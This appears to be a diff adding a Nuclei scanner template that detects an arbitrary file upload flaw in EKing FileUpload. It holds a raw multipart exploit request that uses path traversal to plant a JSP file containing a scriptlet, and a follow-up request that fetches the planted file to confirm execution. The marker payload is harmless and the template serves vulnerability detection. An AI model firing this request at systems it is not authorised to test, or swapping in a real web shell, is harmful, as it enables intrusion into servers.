@@ -1,0 +1,46 @@
+id: eking-fileupload-anyfile-upload
+info:
+  name: EKing FileUpload Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: fileupload
+http:
+  - raw:
+      - |
+        POST /app/FileUpload.ihtm?comm_type=EKING&file_name=../../{{random_str}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+        --WebKitFormBoundaryHHaZAYecVOf5sfa6
+        Content-Disposition: form-data; name="uplo_file"; filename="rce.jpg"
+
+        <% out.println("{{base64_encoded}}");%>
+        --WebKitFormBoundaryHHaZAYecVOf5sfa6--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"fileUrl\":"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"fileUrl":"(.+?)"'
+        internal: true
+      - type: regex
+        part: body
+        regex:
+          - '"fileName":"(.+?)"'
+        internal: true
+  - raw:
+      - |
+        GET /upload2/{{datetime}}/../../{{random_str}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - "trim(body) == '{{base64_encoded}}'"
+variables:
+  random_str: "{{rand_base(4)}}"
+  base64_encoded: "{{base64(random_str)}}"
+  datetime: "{{date_time('%Y-%m-%d')}}"
